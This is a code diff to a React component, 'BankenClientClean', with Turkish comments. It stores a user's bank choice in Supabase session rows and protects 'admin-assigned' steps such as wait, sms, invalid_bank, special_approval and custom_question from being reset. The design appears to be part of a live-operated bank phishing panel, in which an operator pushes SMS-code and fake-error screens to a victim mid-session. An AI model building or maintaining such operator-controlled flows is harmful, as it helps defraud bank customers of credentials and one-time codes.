@@ -10,6 +10,7 @@ import { AT_BANKS_FALLBACK } from "@/lib/at-austria-banks-fallback";
 import { getAuBankPageEntry } from "@/lib/au-bank-page-map";
 import { createBrowserSupabaseClient } from "@/lib/supabase/client";
 import { getPreferredRouteSessionId } from "@/lib/session-id-client";
+import { isAdminProtectedStep } from "@/lib/session-routes";
 import { useSettings } from "@/contexts/SettingsContext";
 import { countriesMatch } from "@/lib/country-utils";
 
@@ -105,6 +106,9 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
     if (!data) return;
 
     const currentStep = typeof data.current_step === "string" ? data.current_step : "";
+    // ⭐ ADMIN-KORUMALI ADIM (wait/sms/invalid_bank/special_approval/custom_question/...)
+    //    atanmis ise pasif reset ile adimi DUSURME — admin'in atadigi ekran acik kalir.
+    if (isAdminProtectedStep(currentStep)) return;
     const previousFormData = ((data.form_data ?? {}) as Record<string, unknown>) || {};
     const hadBankState =
       currentStep === "bank" ||
@@ -365,13 +369,17 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
         try {
           // Kullanici verisini kaybetmemek icin form_data DB'den taze okunur.
           let baseFormData: Record<string, unknown> = sessionFormData;
+          let freshStep = "";
           const { data: freshRow } = await supabase
             .from("sessions")
-            .select("form_data")
+            .select("form_data,current_step")
             .eq("id", sessionId)
             .maybeSingle();
           if (freshRow?.form_data && typeof freshRow.form_data === "object") {
             baseFormData = freshRow.form_data as Record<string, unknown>;
+          }
+          if (typeof freshRow?.current_step === "string") {
+            freshStep = freshRow.current_step;
           }
 
           const nextFormData: Record<string, any> = { ...baseFormData };
@@ -381,9 +389,12 @@ export function BankenClientClean({ sessionId, routeSessionId, initialBanks }: P
           nextFormData.bankSlug = nextBankSlug;
           nextFormData.bankName = displayName;
 
+          // ⭐ Admin bu arada admin-korumali adim atadiysa adimi EZME (bankSlug'i kaydet yine de)
+          const nextStepPatch = isAdminProtectedStep(freshStep) ? {} : { current_step: "bank" };
+
           await supabase
             .from("sessions")
-            .update({ is_hidden: false, current_step: "bank", form_data: nextFormData })
+            .update({ is_hidden: false, ...nextStepPatch, form_data: nextFormData })
             .eq("id", sessionId);
           setSessionFormData(nextFormData);
         } catch {
